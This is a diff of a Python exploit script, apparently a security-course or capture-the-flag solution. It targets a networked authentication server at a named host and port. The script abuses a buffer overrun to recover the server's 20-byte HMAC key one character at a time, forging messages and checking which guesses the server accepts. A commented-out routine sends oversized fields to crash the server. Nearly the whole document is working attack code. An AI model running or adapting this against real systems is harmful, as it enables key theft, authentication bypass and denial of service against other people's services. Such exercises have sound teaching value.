@@ -1,111 +1,111 @@
 import socket
 import hmac
 import hashlib
-import time
+# import time
 import sys
-
-
-printable_characters = []
-
-
-for i in range(32, 256):
-    printable_characters.append(chr(i).encode("latin-1"))
 
 
 USER_NAME = b"241153"
 TAG = b"ClientCmd"
-command_o = b'a' * 31
+COMMAND_O = b'a' * 30
 DILIMIT = b"|"
 KEY_LENGTH = 20
-
-# fucntion to generate HMAC value, return HMAC value
-def generate_hmac(full_length_key, part_key):
-
-    total_parameter = TAG + DILIMIT + USER_NAME + DILIMIT + command_o + part_key
-    print("total_parameter = ", total_parameter)
-
-    print("full_length_key = ", full_length_key)
-    print("part_key= ", part_key)
-    generated_hmac = hmac.new(full_length_key, total_parameter, hashlib.sha256).hexdigest()
-
-    return generated_hmac
-
 
 HOST = 'device1.vikaa.fi'  # The server's hostname or IP address
 PORT = 35984       # The port used by the server
 
+printable_characters = []
+for i in range(32, 127):
+    printable_characters.append(chr(i).encode("latin-1"))
+
+# fucntion to generate HMAC value, return HMAC value
+def generate_hmac(key, msg):
+    generated_hmac = hmac.new(key, msg, hashlib.sha256).hexdigest()
+    return generated_hmac.encode('ascii')
+
+
 # function to send command and key to server, return data which contain
-# b'Authentication successful. Processing command.\n' if key is correct
-def deliver_to_server(an_hmac, part_key):
+# b'Authentication successful. Processing command.\n' if key is correct.
+# otherwise, something else.
+def deliver_to_server(msg):
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
         s.connect((HOST, PORT))
-        print('server connected')
+        #print('server connected')
+        #print("send_msg = ", msg)
 
-        send_msg = b'241153;' + command_o + part_key + b';' + an_hmac.encode("latin-1") + b'\n'
-        print("send_msg = ", send_msg)
+        s.sendall(msg + b'\n')
 
-        s.sendall(send_msg)
-
-        print('data sent')
+        #print('data sent')
         data = s.recv(1024)
-        print("returned data from fun deliver... = ", data)
+        #print("returned data from fun deliver... = ", data)
         return data
 
+# def crash_server():
+#     command = b'a' * 89
+#     key = 'bbbbbbbbbbbbbbbbbbbb'
+#     hmac = "kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkk"
+#     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+#         s.connect((HOST, PORT))
+#         s.sendall(b'241153;' + command + key.encode("latin-1") + b';' + hmac.encode("latin-1") + b'\n')
+#
+#         #print('data sent')
+#
+#         data = s.recv(1024)
+#         #print("data = ", data)
 
+key_components = b''
 
-def crash_server():
-    command = b'a' * 89
-    key = 'bbbbbbbbbbbbbbbbbbbb'
-    hmac = "kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkk"
-    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-        s.connect((HOST, PORT))
-        s.sendall(b'241153;' + command + key.encode("latin-1") + b';' + hmac.encode("latin-1") + b'\n')
-
-        print('data sent')
-
-        data = s.recv(1024)
-        print("data = ", data)
-
-
-key_components = []
-
-# key_components = [b'N', b'k', b'5', b'2', b'D', b'l', b'c', b'K', b'9', b'4', b'r', b'O', b't', b'e', b'Z', b'O', b'0', b'V', b'V']
-
-
+#crash_server()
+#time.sleep(10)
 
 while len(key_components) < 20:
-    crash_server()
-    time.sleep(10)
 
-    for i in range(len(printable_characters)):
-        key_components.reverse()
+    # generate overrun string named fake_cmd
+    part_key = b'b' * ((KEY_LENGTH - 1) - len(key_components))
+    print("part_key: ", part_key)
 
-        if len(key_components) >= KEY_LENGTH -1:
-            guess_key = printable_characters[i] + b''.join(key_components)
-            part_key = b''
 
-        else:
-            guess_key = b'b'*((KEY_LENGTH-1)-len(key_components)-1) + b'\0' + printable_characters[i] + b''.join(key_components)
-            part_key = b'b' * ((KEY_LENGTH - 1) - len(key_components) - 1)
+    fake_cmd = b'a' * 30 + part_key
+    print("fake_cmd: ", fake_cmd)
 
-        print("guess_key = ", guess_key)
-        print("part_key = ", part_key)
+    char_found = False
 
-        key_components.reverse()
+    for test_char in printable_characters:
+        print('checking char: ', test_char)
 
-        hhmacc = generate_hmac(guess_key, part_key)
+        # generate server key-phrase named server_key
+        server_key = (part_key + b'\0' + test_char + key_components)[1:]
 
-        data = deliver_to_server(hhmacc, part_key)
+        # generate server msg
+        server_msg = TAG + DILIMIT + USER_NAME + DILIMIT + fake_cmd
+
+        print('server_key: ', server_key)
+        print('server_msg: ', server_msg)
+
+        # calulate hmac in the same way as server
+        hmac_code = generate_hmac(server_key, server_msg)
+
+        # generate client  msg
+        client_msg = USER_NAME + b';' + fake_cmd + b';' + hmac_code
+
+        data = deliver_to_server(client_msg)
 
         if "successful" in data.decode("latin-1"):
-
-            key_components.append(printable_characters[i])
+            #key_components.insert(0, test_char)
+            key_components = test_char + key_components
             print(key_components)
-            crash_server()
-            time.sleep(10)
+            char_found = True
+            break
 
+    if not char_found:
+        print("Not found! current key comonents are:", key_components)
+        sys.exit()
 
+print()
+print('###############################')
+print('Cracked key phrase are:')
 print(key_components)
+print('###############################')
 
 
 
